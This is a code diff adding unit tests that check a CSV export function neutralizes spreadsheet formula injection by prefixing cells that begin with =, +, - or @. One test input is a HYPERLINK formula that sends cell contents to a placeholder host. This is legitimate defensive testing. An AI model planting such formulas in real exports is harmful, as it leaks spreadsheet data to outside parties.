@@ -61,3 +61,15 @@ describe("toCSV", () => {
     expect(parseCSV(toCSV(["name", "address"], rows))).toEqual([["name", "address"], ...rows]);
   });
 });
+
+describe("toCSV formula neutralizing", () => {
+  it("prefixes cells a spreadsheet would run as a formula", () => {
+    expect(toCSV(["name"], [['=HYPERLINK("https://x.example/?"&B2,"Open")']]))
+      .toBe('name\r\n"\'=HYPERLINK(""https://x.example/?""&B2,""Open"")"');
+    expect(toCSV(["a", "b", "c"], [["+cmd", "-1", "@SUM(A1)"]])).toBe("a,b,c\r\n'+cmd,'-1,'@SUM(A1)");
+  });
+
+  it("leaves normal values alone", () => {
+    expect(toCSV(["phone", "city"], [["(404) 555-0100", "Atlanta"]])).toBe("phone,city\r\n(404) 555-0100,Atlanta");
+  });
+});
